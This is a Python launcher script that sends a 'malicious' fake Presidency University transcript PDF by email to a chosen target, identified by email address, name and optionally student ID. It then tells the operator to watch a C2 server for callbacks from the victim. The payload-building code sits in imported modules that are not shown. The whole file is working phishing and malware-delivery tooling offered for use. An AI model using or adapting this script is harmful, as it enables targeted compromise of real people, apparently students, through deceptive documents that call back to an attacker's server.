#!/usr/bin/env python3

import os
import sys
import argparse

# Add the current directory to the path so we can import our modules
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from tools.pdf_deployer import PDFDeployer
from core.config_manager import ConfigManager

def main():
    parser = argparse.ArgumentParser(description='Deploy malicious Presidency University transcript PDF')
    parser.add_argument('--email', required=True, help='Target email address')
    parser.add_argument('--name', required=True, help='Target full name')
    parser.add_argument('--student-id', help='Target student ID (optional)')
    parser.add_argument('--program', help='Target program (optional)')
    parser.add_argument('--year', help='Academic year (optional)')
    
    args = parser.parse_args()
    
    # Initialize deployer
    deployer = PDFDeployer()
    
    # Create and send the PDF
    print(f"[*] Creating and sending malicious PDF to {args.email}...")
    filename = deployer.create_and_send_pdf(
        target_email=args.email,
        target_name=args.name,
        template_type="university_transcript"
    )
    
    print(f"[*] Malicious PDF sent successfully: {filename}")
    print(f"[*] Monitor your C2 server for callbacks from {args.name}")

if __name__ == "__main__":
    main()
